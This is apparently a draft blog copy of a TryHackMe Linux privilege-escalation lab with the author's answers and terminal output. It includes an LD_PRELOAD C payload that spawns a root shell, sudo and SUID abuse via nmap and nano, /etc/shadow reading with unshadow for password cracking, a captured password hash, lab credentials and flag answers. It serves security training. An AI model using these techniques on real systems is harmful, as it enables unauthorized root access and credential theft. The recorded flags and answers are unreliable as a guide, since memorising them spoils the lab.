---
title: "Linux Privilege Escalation"
date: 2023-05-09T16:20:43-07:00
draft: true
---

# Linux Privilege Escalation

## Task 1 Introduction

Privilege escalation is a journey. There are no silver bullets, and much depends on the specific configuration of the target system. The kernel version, installed applications, supported programming languages, other users' passwords are a few key elements that will affect your road to the root shell.  
  
This room was designed to cover the main privilege escalation vectors and give you a better understanding of the process. This new skill will be an essential part of your arsenal whether you are participating in CTFs, taking certification exams, or working as a penetration tester.

Answer the questions below

Read the above.

## Task 2 What is Privilege Escalation?

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/2e51bfc8489168a3f6580dc76b46ba90.png)What does "privilege escalation" mean?

At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.  
  

Why is it important?

It's rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:

-   Resetting passwords  
    
-   Bypassing access controls to compromise protected data
-   Editing software configurations
-   Enabling persistence
-   Changing the privilege of existing (or new) users
-   Execute any administrative command

Answer the questions below

Read the above.

## Task 3 Enumeration

**Note: Launch the target machine attached to this task to follow along.**

**You can launch the target machine and access it directly from your browser.**

**Alternatively, you can access it over SSH with the low-privilege user credentials below:  
**

**Username: karen**

**Password: Password1**

Enumeration is the first step you have to take once you gain access to any system. You may have accessed the system by exploiting a critical vulnerability that resulted in root-level access or just found a way to send commands using a low privileged account. Penetration testing engagements, unlike CTF machines, don't end once you gain access to a specific system or user privilege level. As you will see, enumeration is as important during the post-compromise phase as it is before.

### hostname

  

The `hostname` command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-3487340239), in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).

  

### uname -a

Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.

  

### /proc/version

The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.

Looking at `/proc/version` may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

  

  

### /etc/issue

Systems can also be identified by looking at the `/etc/issue` file. This file usually contains some information about the operating system but can easily be customized or changes. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always good to look at all of these.

### ps Command

The `ps` command is an effective way to see the running processes on a Linux system. Typing `ps` on your terminal will show processes for the current shell.

The output of the `ps` (Process Status) will show the following;

-   PID: The process ID (unique to the process)
-   TTY: Terminal type used by the user
-   Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
-   CMD: The command or executable running (will NOT display any command line parameter)

The “ps” command provides a few useful options.

-   `ps -A`: View all running processes
-   `ps axjf`: View process tree (see the tree formation until `ps axjf` is run below)

![](https://i.imgur.com/xsbohSd.png)  

-   `ps aux`: The `aux` option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.  
    

### env

  

The `env` command will show environmental variables.

  

![](https://i.imgur.com/LWdJ8Fw.png)

  

The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.

  

### sudo -l

  

The target system may be configured to allow users to run some (or all) commands with root privileges. The `sudo -l` command can be used to list all commands your user can run using `sudo`.

  

ls

One of the common commands used in Linux is probably `ls`.

  

While looking for potential privilege escalation vectors, please remember to always use the `ls` command with the `-la` parameter. The example below shows how the “secret.txt” file can easily be missed using the `ls` or `ls -l` commands.

![](https://i.imgur.com/2jOtOat.png)  

  

  

### Id

  

The `id` command will provide a general overview of the user’s privilege level and group memberships.

  

It is worth remembering that the `id` command can also be used to obtain the same information for another user as seen below.

  

![](https://i.imgur.com/YzfJliG.png)

  

  

### /etc/passwd

  

Reading the `/etc/passwd` file can be an easy way to discover users on the system.

  

![](https://i.imgur.com/r6oYOEi.png)

  

While the output can be long and a bit intimidating, it can easily be cut and converted to a useful list for brute-force attacks.

![](https://i.imgur.com/cpS2U93.png)

  

Remember that this will return all users, some of which are system or service users that would not be very useful. Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory.

  

![](https://i.imgur.com/psxE6V4.png)

  

  

### history

Looking at earlier commands with the `history` command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.

  

  

### ifconfig

  

The target system may be a pivoting point to another network. The `ifconfig` command will give us information about the network interfaces of the system. The example below shows the target system has three interfaces (eth0, tun0, and tun1). Our attacking machine can reach the eth0 interface but can not directly access the two other networks.

  

![](https://i.imgur.com/hcdZnwK.png)

  

  

This can be confirmed using the `ip route` command to see which network routes exist.

  

![](https://i.imgur.com/PSrmz5O.png)

  

  

### netstat

  

Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The `netstat` command can be used with several different options to gather information on existing connections.

  

-   `netstat -a`: shows all listening ports and established connections.
-   `netstat -at` or `netstat -au` can also be used to list TCP or UDP protocols respectively.
-   `netstat -l`: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)

  

![](https://i.imgur.com/BbLdyrr.png)

  

-   `netstat -s`: list network usage statistics by protocol (below) This can also be used with the `-t` or `-u` options to limit the output to a specific protocol.

  

![](https://i.imgur.com/mc8OWP0.png)

  

-   `netstat -tp`: list connections with the service name and PID information.

  

![](https://i.imgur.com/fDYQwbW.png)

  

This can also be used with the `-l` option to list listening ports (below)

  

![](https://i.imgur.com/JK7DNv0.png)

  

We can see the “PID/Program name” column is empty as this process is owned by another user.

Below is the same command run with root privileges and reveals this information as 2641/nc (netcat)

![](https://i.imgur.com/FjZHqlY.png)

-   `netstat -i`: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.

![](https://i.imgur.com/r6IjpmZ.png)

  

  

The `netstat` usage you will probably see most often in blog posts, write-ups, and courses is `netstat -ano` which could be broken down as follows;

-   `-a`: Display all sockets
-   `-n`: Do not resolve names
-   `-o`: Display timers

  

![](https://i.imgur.com/UxzLBRw.png)

  

  

### find Command

Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal.

Below are some useful examples for the “find” command.

**Find files:**

-   `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
-   `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
-   `find / -type d -name config`: find the directory named config under “/”
-   `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
-   `find / -perm a=x`: find executable files
-   `find /home -user frank`: find all files for user “frank” under “/home”
-   `find / -mtime 10`: find files that were modified in the last 10 days
-   `find / -atime 10`: find files that were accessed in the last 10 day
-   `find / -cmin -60`: find files changed within the last hour (60 minutes)
-   `find / -amin -60`: find files accesses within the last hour (60 minutes)
-   `find / -size 50M`: find files with a 50 MB size

This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.

![](https://i.imgur.com/pSMfoz4.png)

The example above returns files that are larger than 100 MB. It is important to note that the “find” command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the “find” command with “-type f 2>/dev/null” to redirect errors to “/dev/null” and have a cleaner output (below).

![](https://i.imgur.com/UKYSdE3.png)

  

Folders and files that can be written to or executed from:

-   `find / -writable -type d 2>/dev/null` : Find world-writeable folders
-   `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
-   `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders

The reason we see three different “find” commands that could potentially lead to the same result can be seen in the manual document. As you can see below, the perm parameter affects the way “find” works.

![](https://i.imgur.com/qb0klHH.png)  

-   `find / -perm -o x -type d 2>/dev/null` : Find world-executable folders

Find development tools and supported languages:

-   `find / -name perl*`
-   `find / -name python*`
-   `find / -name gcc*`

Find specific file permissions:

Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it. This allows for an interesting privilege escalation path,we will see in more details on task 6. The example below is given to complete the subject on the “find” command.

-   `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.

### General Linux Commands

As we are in the Linux realm, familiarity with Linux commands, in general, will be very useful. Please spend some time getting comfortable with commands such as `find`, `locate`, `grep`, `cut`, `sort`, etc.

Answer the questions below

What is the hostname of the target system?  
A: wade7363
What is the Linux kernel version of the target system?  
A: 3.13.0-24-generic
What Linux is this?  
A: Ubuntu 14.04 LTS
What version of the Python language is installed on the system?  
A: 2.7.6
What vulnerability seem to affect the kernel of the target system? (Enter a CVE number)
A: CVE-2015-1328 

## Task 3 notes
$ hostname
wade7363

$ uname -a
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux

$ cat /proc/version
Linux version 3.13.0-24-generic (buildd@panlong) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014

$ cat /etc/issue
Ubuntu 14.04 LTS \n \l

$ ps
  PID TTY          TIME CMD
 1629 pts/4    00:00:00 sh
 1759 pts/4    00:00:00 ps
  
  note: ps -A for all running processes
  ps axjf view process tree - I think this is more useful
  ps aux will show processes for all users -may be better sometimes
  
$ env
MAIL=/var/mail/karen
USER=karen
SSH_CLIENT=10.13.27.214 44060 22
HOME=/home/karen
SSH_TTY=/dev/pts/4
QT_QPA_PLATFORMTHEME=appmenu-qt5
LOGNAME=karen
TERM=st-256color
XDG_SESSION_ID=1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
XDG_RUNTIME_DIR=/run/user/1001
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/
SSH_CONNECTION=10.13.27.214 44060 10.10.202.224 22

$ ls -al
total 104
drwxr-xr-x  23 root root  4096 Jun 18  2021 .
drwxr-xr-x  23 root root  4096 Jun 18  2021 ..
drwxr-xr-x   2 root root  4096 Jun 18  2021 bin
drwxr-xr-x   3 root root  4096 Jun 18  2021 boot
drwxrwxr-x   2 root root  4096 Jun 18  2021 cdrom
drwxr-xr-x  13 root root  3920 Feb  2 19:42 dev
drwxr-xr-x 129 root root 12288 Feb  2 19:43 etc
drwxr-xr-x   3 root root  4096 Jun 18  2021 home
lrwxrwxrwx   1 root root    33 Jun 18  2021 initrd.img -> boot/initrd.img-3.13.0-24-generic
drwxr-xr-x  23 root root  4096 Jun 18  2021 lib
drwxr-xr-x   2 root root  4096 Apr 16  2014 lib64
drwx------   2 root root 16384 Jun 18  2021 lost+found
drwxr-xr-x   2 root root  4096 Apr 16  2014 media
drwxr-xr-x   2 root root  4096 Apr 10  2014 mnt
drwxr-xr-x   2 root root  4096 Apr 16  2014 opt
dr-xr-xr-x 155 root root     0 Feb  2 19:42 proc
drwx------   2 root root  4096 Jun 18  2021 root
drwxr-xr-x  22 root root   760 Feb  2 19:44 run
drwxr-xr-x   2 root root 12288 Jun 18  2021 sbin
drwxr-xr-x   2 root root  4096 Apr 16  2014 srv
dr-xr-xr-x  13 root root     0 Feb  2 19:42 sys
drwxrwxrwt   4 root root  4096 Feb  2 19:47 tmp
drwxr-xr-x  10 root root  4096 Apr 16  2014 usr
drwxr-xr-x  13 root root  4096 Apr 16  2014 var
lrwxrwxrwx   1 root root    30 Jun 18  2021 vmlinuz -> boot/vmlinuz-3.13.0-24-generic

$ id
uid=1001(karen) gid=1001(karen) groups=1001(karen)

$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
dnsmasq:x:104:65534:dnsmasq,,,:/var/lib/misc:/bin/false
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
kernoops:x:106:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
rtkit:x:107:114:RealtimeKit,,,:/proc:/bin/false
saned:x:108:115::/home/saned:/bin/false
whoopsie:x:109:116::/nonexistent:/bin/false
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
avahi:x:111:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
lightdm:x:112:118:Light Display Manager:/var/lib/lightdm:/bin/false
colord:x:113:121:colord colour management daemon,,,:/var/lib/colord:/bin/false
hplip:x:114:7:HPLIP system user,,,:/var/run/hplip:/bin/false
pulse:x:115:122:PulseAudio daemon,,,:/var/run/pulse:/bin/false
matt:x:1000:1000:matt,,,:/home/matt:/bin/bash
karen:x:1001:1001::/home/karen:
sshd:x:116:65534::/var/run/sshd:/usr/sbin/nologin

$ cat /etc/passwd | cut -d ":" -f 1
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
www-data
backup
list
irc
gnats
nobody
libuuid
syslog
messagebus
usbmux
dnsmasq
avahi-autoipd
kernoops
rtkit
saned
whoopsie
speech-dispatcher
avahi
lightdm
colord
hplip
pulse
matt
karen
sshd

$ cat /etc/passwd | grep home
syslog:x:101:104::/home/syslog:/bin/false
usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
saned:x:108:115::/home/saned:/bin/false
matt:x:1000:1000:matt,,,:/home/matt:/bin/bash
karen:x:1001:1001::/home/karen:

$ history
-sh: 22: history: not found

$ ifconfig
eth0      Link encap:Ethernet  HWaddr 02:36:d4:a8:12:3b
          inet addr:10.10.202.224  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::36:d4ff:fea8:123b/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:832 errors:0 dropped:0 overruns:0 frame:0
          TX packets:671 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:66508 (66.5 KB)  TX bytes:133197 (133.1 KB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:125 errors:0 dropped:0 overruns:0 frame:0
          TX packets:125 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:9025 (9.0 KB)  TX bytes:9025 (9.0 KB)
		  
$ ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:36:d4:a8:12:3b brd ff:ff:ff:ff:ff:ff
    inet 10.10.202.224/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::36:d4ff:fea8:123b/64 scope link
       valid_lft forever preferred_lft forever

$ ip route
default via 10.10.0.1 dev eth0
10.10.0.0/16 dev eth0  proto kernel  scope link  src 10.10.202.224
169.254.0.0/16 dev eth0  scope link  metric 1000

$ netstat -at
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 *:ssh                   *:*                     LISTEN
tcp        0      0 localhost:ipp           *:*                     LISTEN
tcp        0      0 ip-10-10-202-224.eu:ssh ip-10-13-27-214.e:44060 ESTABLISHED
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN
tcp6       0      0 ip6-localhost:ipp       [::]:*                  LISTEN
tcp6       1      0 ip6-localhost:53629     ip6-localhost:ipp       CLOSE_WAIT

$ netstat -l
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 *:ssh                   *:*                     LISTEN
tcp        0      0 localhost:ipp           *:*                     LISTEN
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN
tcp6       0      0 ip6-localhost:ipp       [::]:*                  LISTEN
udp        0      0 *:29177                 *:*
udp        0      0 *:bootpc                *:*
udp        0      0 *:ipp                   *:*
udp        0      0 *:mdns                  *:*
udp        0      0 *:40317                 *:*
udp6       0      0 [::]:45626              [::]:*
udp6       0      0 [::]:mdns               [::]:*
udp6       0      0 [::]:13550              [::]:*
Active UNIX domain sockets (only servers)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ACC ]     STREAM     LISTENING     11265    /run/user/112/pulse/native
unix  2      [ ACC ]     STREAM     LISTENING     9882     /tmp/.X11-unix/X0
unix  2      [ ACC ]     STREAM     LISTENING     9881     @/tmp/.X11-unix/X0
unix  2      [ ACC ]     STREAM     LISTENING     10720    @/tmp/dbus-RxgAdsUWl5
unix  2      [ ACC ]     STREAM     LISTENING     9862     /var/lib/amazon/ssm/ipc/termination
unix  2      [ ACC ]     SEQPACKET  LISTENING     7496     /run/udev/control
unix  2      [ ACC ]     STREAM     LISTENING     7112     @/com/ubuntu/upstart
unix  2      [ ACC ]     STREAM     LISTENING     9580     /var/run/acpid.socket
unix  2      [ ACC ]     STREAM     LISTENING     10911    @/com/ubuntu/upstart-session/112/1350
unix  2      [ ACC ]     STREAM     LISTENING     7807     /var/run/avahi-daemon/socket
unix  2      [ ACC ]     STREAM     LISTENING     9861     /var/lib/amazon/ssm/ipc/health
unix  2      [ ACC ]     STREAM     LISTENING     7602     /var/run/dbus/system_bus_socket
unix  2      [ ACC ]     STREAM     LISTENING     7876     /var/run/sdp
unix  2      [ ACC ]     STREAM     LISTENING     10672    @/tmp/dbus-Zk3K27Qtrs
unix  2      [ ACC ]     STREAM     LISTENING     10491    /var/run/cups/cups.sock
$ netstat -lt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 *:ssh                   *:*                     LISTEN
tcp        0      0 localhost:ipp           *:*                     LISTEN
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN
tcp6       0      0 ip6-localhost:ipp       [::]:*                  LISTEN
$ netstat -au
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
udp        0      0 *:29177                 *:*
udp        0      0 *:bootpc                *:*
udp        0      0 *:ipp                   *:*
udp        0      0 *:mdns                  *:*
udp        0      0 *:40317                 *:*
udp6       0      0 [::]:45626              [::]:*
udp6       0      0 [::]:mdns               [::]:*
udp6       0      0 [::]:13550              [::]:*

$ netstat -s
Ip:
    1166 total packets received
    0 forwarded
    0 incoming packets discarded
    1164 incoming packets delivered
    855 requests sent out
Icmp:
    0 ICMP messages received
    0 input ICMP message failed.
    ICMP input histogram:
    0 ICMP messages sent
    0 ICMP messages failed
    ICMP output histogram:
Tcp:
    82 active connections openings
    3 passive connection openings
    52 failed connection attempts
    0 connection resets received
    1 connections established
    1175 segments received
    845 segments send out
    24 segments retransmited
    0 bad segments received. 
	52 resets sent
Udp:
    62 packets received
    0 packets to unknown port received.
    0 packet receive errors
    94 packets sent
UdpLite:
TcpExt:
    4 TCP sockets finished time wait in fast timer
    5 delayed acks sent
    Quick ack mode was activated 1 times
    22 packet headers predicted
    76 acknowledgments not containing data payload received
    541 predicted acknowledgments
    6 other TCP timeouts
    1 DSACKs sent for old packets
    TCPRcvCoalesce: 3
IpExt:
    InNoRoutes: 2
    InMcastPkts: 28
    OutMcastPkts: 30
    InOctets: 90473
    OutOctets: 189260
    InMcastOctets: 3855
    OutMcastOctets: 3935
    InNoECTPkts: 1167

$ netstat -tp
(No info could be read for "-p": geteuid()=1001 but you should be root.)
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 ip-10-10-202-224.eu:ssh ip-10-13-27-214.e:44060 ESTABLISHED -
tcp6       1      0 ip6-localhost:53629     ip6-localhost:ipp       CLOSE_WAIT  -

$ netstat -ltp
(No info could be read for "-p": geteuid()=1001 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 *:ssh                   *:*                     LISTEN      -
tcp        0      0 localhost:ipp           *:*                     LISTEN      -
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      -
tcp6       0      0 ip6-localhost:ipp       [::]:*                  LISTEN      -

[jmk@arch THM]$ netstat -i
Kernel Interface table
Iface             MTU    RX-OK RX-ERR RX-DRP RX-OVR    TX-OK TX-ERR TX-DRP TX-OVR Flg
enp4s0           1500 68970011      0    327 0      29465019      0      0      0 BMRU
lo              65536      506      0      0 0           506      0      0      0 LRU
tun0             1500      679      0      0 0          1153      0      0      0 MOPRU


## Task 4 Automated Enumeration Tools

Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.

The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.

-   **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
-   **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
-   **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
-   **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
-   **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

Answer the questions below

Install and try a few automated enumeration tools on your local Linux distribution

## Task 5 Privilege Escalation: Kernel Exploits

**Note: Launch the target machine attached to this task to follow along.**

**You can launch the target machine and access it directly from your browser.**

**Alternatively, you can access it over SSH with the low-privilege user credentials below:  
**

**Username: karen**

**Password: Password1**

  

Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.

  

Unless a single vulnerability leads to a root shell, the privilege escalation process will rely on misconfigurations and lax permissions.

  

The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.

  

The Kernel exploit methodology is simple;

1.  Identify the kernel version
2.  Search and find an exploit code for the kernel version of the target system
3.  Run the exploit

Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.

  

**Research sources:**  

1.  Based on your findings, you can use Google to search for an existing exploit code.
2.  Sources such as [https://www.linuxkernelcves.com/cves](https://www.linuxkernelcves.com/cves) can also be useful.
3.  Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).  
    

  

**Hints/Notes:**

1.  Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
2.  Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
3.  Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
4.  You can transfer the exploit code from your machine to the target system using the `SimpleHTTPServer` Python module and `wget` respectively.

  

  

Answer the questions below

find and use the appropriate kernel exploit to gain root privileges on the target system.  

What is the content of the flag1.txt file?
A: THM-28392872729920

## Task 6 Privilege Escalation: Sudo

**Note: Launch the target machine attached to this task to follow along.**

**You can launch the target machine and access it directly from your browser.**

**Alternatively, you can access it over SSH with the low-privilege user credentials below:  
**

**Username: karen**

**Password: Password1**

The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.

Any user can check its current situation related to root privileges using the `sudo -l` command.

[https://gtfobins.github.io/](https://gtfobins.github.io/) is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.

**Leverage application functions**  

Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.

In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (`-f` : specify an alternate ServerConfigFile).

![](https://i.imgur.com/rNpbbL8.png)  

Loading the `/etc/shadow` file using this option will result in an error message that includes the first line of the `/etc/shadow` file.

**Leverage LD_PRELOAD**

On some systems, you may see the LD_PRELOAD environment option.

![](https://i.imgur.com/gGstS69.png)  

LD_PRELOAD is a function that allows any program to use shared libraries. This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.  

The steps of this privilege escalation vector can be summarized as follows;

1.  Check for LD_PRELOAD (with the env_keep option)
2.  Write a simple C code compiled as a share object (.so extension) file
3.  Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;

#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}  

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

![](https://i.imgur.com/HxbszMW.png)  

We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD_PRELOAD option, as follows;

`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`

This will result in a shell spawn with root privileges.

![](https://i.imgur.com/1YwARyZ.png)  

  

Answer the questions below

How many programs can the user "karen" run on the target system with sudo rights?  
A: 3
What is the content of the flag2.txt file?  
A: THM-402028394
How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?  
A: sudo nmap --interactive
What is the hash of frank's password?
A: "$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1 "

## Task 7 Privilege Escalation: SUID

**Note: Launch the target machine attached to this task to follow along.**

**You can launch the target machine and access it directly from your browser.**

**Alternatively, you can access it over SSH with the low-privilege user credentials below:  
**

**Username: karen**

**Password: Password1**

Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.  
  
You will notice these files have an “s” bit set showing their special permission level.  
  
`find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set.

![](https://i.imgur.com/fJEeZ4m.png)

A good practice would be to compare executables on this list with GTFOBins ([https://gtfobins.github.io](https://gtfobins.github.io/)). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list [https://gtfobins.github.io/#+suid](https://gtfobins.github.io/#+suid)).

  

The list above shows that nano has the SUID bit set. Unfortunately, GTFObins does not provide us with an easy win. Typical to real-life privilege escalation scenarios, we will need to find intermediate steps that will help us leverage whatever minuscule finding we have.

  

  

![](https://i.imgur.com/rSRTn5v.png)  

  

The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. At this stage, we have two basic options for privilege escalation: reading the `/etc/shadow` file or adding our user to `/etc/passwd`.  
  
  
Below are simple steps using both vectors.  
  
reading the `/etc/shadow` file  
  
We see that the nano text editor has the SUID bit set by running the `find / -type f -perm -04000 -ls 2>/dev/null` command.  
  
`nano /etc/shadow` will print the contents of the `/etc/shadow` file. We can now use the unshadow tool to create a file crackable by John the Ripper. To achieve this, unshadow needs both the `/etc/shadow` and `/etc/passwd` files.

![](https://i.imgur.com/DAWxbJD.png)  

The unshadow tool’s usage can be seen below;  
`unshadow passwd.txt shadow.txt > passwords.txt`  

